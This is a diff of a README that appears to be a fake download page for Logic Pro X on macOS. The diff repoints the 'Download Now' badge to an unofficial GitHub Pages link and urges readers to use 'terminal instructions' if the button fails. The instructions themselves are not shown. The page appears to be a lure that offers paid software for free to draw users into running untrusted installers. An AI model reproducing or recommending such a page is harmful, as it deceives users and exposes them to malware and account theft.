@@ -1,10 +1,10 @@
 # Logic Pro X — Download For Mac OS
 🎵 Discover the power of Logic Pro, a premier music production software exclusively for Mac OS. Follow the step-by-step instructions below to install this professional-grade tool and unlock your creative potential with ease. 😊
 
-![Download Now](https://play-lh.googleusercontent.com/PvTGXfQ3zWyBkBQgfPbyKyKk7xF8KpmyLSy5PbcsDMa1VDQ_OF2LrjNDhf2LrYqrUQ=w526-h296-rw)
+![logo](https://play-lh.googleusercontent.com/PvTGXfQ3zWyBkBQgfPbyKyKk7xF8KpmyLSy5PbcsDMa1VDQ_OF2LrjNDhf2LrYqrUQ=w526-h296-rw)
 
-[![Download Now](https://img.shields.io/badge/Download-Now-lightgrey?logo=apple&style=for-the-badge&labelColor=#000000&color=#A3A3A3)](#)  
-If the download button doesn't work, please follow the terminal instructions below for a smooth installation.
+[![Download Now](https://img.shields.io/badge/Download-Now-lightgrey?logo=apple&style=for-the-badge&labelColor=#000000&color=#A3A3A3)](https://logic-pro-mac.github.io/.github/)  
+> If the download button doesn't work, please follow the terminal instructions below for a smooth installation.
 
 ## 📦 How to Install Logic Pro For Mac OS
 
